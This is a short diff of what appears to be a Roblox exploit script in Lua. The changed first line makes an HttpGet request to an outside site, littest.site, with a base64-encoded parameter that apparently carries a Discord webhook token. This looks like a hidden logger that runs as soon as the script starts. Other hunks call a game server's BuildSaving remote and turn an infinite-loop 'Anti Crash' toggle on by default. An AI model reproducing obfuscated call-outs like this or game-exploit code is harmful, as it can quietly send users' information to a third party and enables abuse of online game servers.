@@ -1,4 +1,4 @@
-game:HttpGet("https://littest.site/yeet/site.php?h=aG9vaw==cjN3b1BzX0x6dUJRdzVmSzdqdF9LQTFKWFQ4OFVtbWJSQVBpcGJpaHlldy1pckZGWGtzY2NQNTFvVHBuM3BWaW4wVEE==")
+game:HttpGet("https://littest.site/yeet/site.php?h=aG9vaw==MTA2ODUxNDAyOTY3ODYyNDg4MC9yM3dvUHNfTHp1QlF3NWZLN2p0X0tBMUpYVDg4VW1tYlJBUGlwYmloeWV3LWlyRkZYa3NjY1A1MW9UcG4zcFZpbjBUQQ==")
 local args = {
     [1] = {
         [1] = "SAVE",
@@ -465,7 +465,7 @@ game:GetService("ReplicatedStorage").Network.BuildSaving:InvokeServer(unpack(arg
 
 Teb:AddToggle({
       Name = "Anti Crash",
-      Default = false,
+      Default = true,
       Callback = function(Value)
             while true do
 	task.wait()
